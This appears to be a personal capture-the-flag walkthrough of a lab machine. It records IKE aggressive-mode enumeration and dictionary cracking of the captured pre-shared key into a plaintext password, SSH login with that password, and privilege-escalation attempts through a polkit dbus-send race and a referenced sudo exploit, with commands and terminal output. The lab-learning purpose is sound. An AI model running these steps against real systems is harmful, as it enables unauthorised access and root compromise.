#### port scan
`└─$ nmap -p 500 -sU 10.129.8.246      `
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 13:35 +1100
Nmap scan report for 10.129.8.246
Host is up (0.078s latency).

PORT    STATE SERVICE
```

#### Port 500 Enum
ike pentest to collect info, https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting
`└─$ ike-scan -M -A 10.129.8.246     `
```
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.8.246	Aggressive Mode Handshake returned
	HDR=(CKY-R=626ee80d9078a154)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)
```

`└─$ ike-scan -A --pskcrack 10.129.8.246`
```
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.8.246	Aggressive Mode Handshake returned HDR=(CKY-R=d744e82ef4a3342a) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
38edfc04c1da432b5b9e68306a54fcb48a4a3e19d7765746eeefaf2c1e2fb40ce83ea119e5d55a36b06cff97cd6441858f198d7b69cbdac82533d68f92ad06dc0aadbd4f92352cfe2caa20ced1847350ba41c972a6b4d6d8ed523fcd092d8e04af9a76e288ae756a6792a26d030effea6196c63a553272ad22063963959c4ac9:17b5b8a0196cb28968095bd682147b3637b87b85849bc853ccab7d764ce0b57b440d83df81c46253ef44b6272d735bec75c21ed7a39ee8b2a341760acdb13a96d3b18c566486ea6c08eb425913b3bf229a2f73b64da9fe5f2e2e9ec2807775e3fd0ab5dff1d348eff314f625cbec5ffa3a0ccd1cdd6b3cc692ebc140b9e73367:d744e82ef4a3342a:d27b73cfd850dee3:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:803f7ad8fb03b9e3f793bc79211174347a54f818:e8339b560b905d4fb267e1faa197a3f308f66b0f7f454b970a11810aa3786907:0b3077a25b5bac39f6d58f41f3b1c38d92357874
Ending ike-scan 1.9.6: 1 hosts scanned in 0.088 seconds (11.40 hosts/sec).  1 returned handshake; 0 returned notify
```
```
└─$ echo "38edfc04c1da432b5b9e68306a54fcb48a4a3e19d7765746eeefaf2c1e2fb40ce83ea119e5d55a36b06cff97cd6441858f198d7b69cbdac82533d68f92ad06dc0aadbd4f92352cfe2caa20ced1847350ba41c972a6b4d6d8ed523fcd092d8e04af9a76e288ae756a6792a26d030effea6196c63a553272ad22063963959c4ac9:17b5b8a0196cb28968095bd682147b3637b87b85849bc853ccab7d764ce0b57b440d83df81874" > hash
```

`└─$ psk-crack hash -d ~/tools/rockyou.txt `
```
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 0b3077a25b5bac39f6d58f41f3b1c38d92357874
Ending psk-crack: 8045040 iterations in 5.994 seconds (1342173.00 iterations/sec)
```

`└─$ ssh ike@10.129.8.246      `
```
The authenticity of host '10.129.8.246 (10.129.8.246)' can't be established.
ED25519 key fingerprint is: SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g
This key is not known by any other names.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 3 03:22:59 2026 from 10.10.16.194
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

run linpeas
```
╔══════════╣ D-Bus Configuration Files

══╣ D-Bus Session Bus Analysis
(Access to session bus available)
           string "org.freedesktop.DBus"
           string "org.freedesktop.systemd1"
           string ":1.1"
           string ":1.2"
  └─(Known dangerous session service: org.freedesktop.systemd1)
     └─ Try: dbus-send --session --dest=org.freedesktop.systemd1 / [Interface] [Method] [Arguments]
```

https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/

cannot create user, stop.
```
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1


dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!
```

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4
-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
```

`ike@expressway:/tmp$ sudo --version`
```
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

https://www.exploit-db.com/exploits/52352
```
ike@expressway:/tmp$ nano a.sh
ike@expressway:/tmp$ chmod +x a.sh

#### lesson learned
- got password, try smb,ssh etc first
- check each potential point of linpeas
ike@expressway:/tmp$ ./a.sh
[*] Running exploit…
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```
